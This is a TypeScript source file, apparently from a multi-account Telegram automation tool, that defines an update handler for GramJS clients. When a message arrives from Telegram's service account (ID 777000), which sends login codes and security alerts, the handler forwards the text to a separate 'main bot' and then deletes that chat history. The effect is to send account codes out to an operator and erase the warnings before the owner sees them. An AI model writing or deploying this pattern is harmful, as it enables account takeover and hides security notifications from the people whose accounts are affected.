import BigInt from 'big-integer';

import { TelegramClient } from '../../../gramjs';
import GramJs from '../../../gramjs/tl/api';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { deleteHistory } from '../messages/deleteHistory';

export const handleUpdate = async (
  client: TelegramClient | null,
  accountId: string,
  update: any
) => {
  if (!update) {
    return;
  }

  if (
    update.className === 'UpdateConnectionState' ||
    update.className === 'UpdateUserStatus' ||
    update.className === 'UpdateUserTyping'
  ) {
    if (process.env.DEV !== 'true') {
      return;
    }
  }

  console.log({
    accountId,
    message: `<${update.className}>`,
    payload: JSON.parse(JSON.stringify(update)),
  });

  if (update instanceof GramJs.UpdateShortMessage) {
    if (String(update.userId) === '777000') {
      console.warn({
        accountId,
        message: '[TELEGRAM_SERVICE_NOTIFICATION]',
        payload: JSON.parse(JSON.stringify(update)),
      });
      await sendToMainBot(
        `[TELEGRAM_SERVICE_NOTIFICATION]
ID: ${accountId}
MESSAGE: ${update.message}`
      );
      if (client) {
        await deleteHistory(
          client,
          new GramJs.InputPeerUser({
            userId: update.userId,
            accessHash: BigInt(0),
          }),
          true
        );
      }
    }
  }
};
